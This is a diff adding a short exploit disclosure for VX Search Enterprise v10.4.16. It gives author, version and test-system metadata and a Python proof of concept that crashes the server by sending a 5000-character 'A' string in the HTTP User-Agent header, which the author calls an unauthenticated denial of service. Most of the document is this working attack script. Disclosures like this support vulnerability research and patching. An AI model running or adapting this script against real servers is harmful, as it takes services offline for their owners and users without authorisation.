@@ -1,0 +1,28 @@
+# Exploit Title: VX Search Enterprise v10.4.16 DoS
+# Google Dork: N/A
+# Date: 17.01.2018
+# Exploit Author: James Chamberlain [chumb0]
+# Vendor Homepage: http://www.vxsearch.com/downloads.html
+# Software Link: http://www.vxsearch.com/setups/vxsearchent_setup_v10.4.16.exe
+# Version: v10.4.16
+# Tested on: Windows 7 Home x86
+# CVE : N/A
+
+# Have been unable to overwrite SEH/EIP, but the crash serves as an unauthenticated DoS.
+
+# Replication - Large buffer sent in the majority of Request Headers. PoC attached. Server needs http enabling (non default)
+
+ #!/usr/bin/python
+import socket
+
+pwnd = "A" * 5000
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect=s.connect(('192.168.50.133', 80))
+buf = ""
+buf += "GET / HTTP/1.1" + "\r\n"
+buf += "Host: 192.168.50.133\r\n"
+buf += "User-Agent: " + pwnd + "r\n"
+buf += "\r\n\r\n"
+s.send(buf)
+s.close()
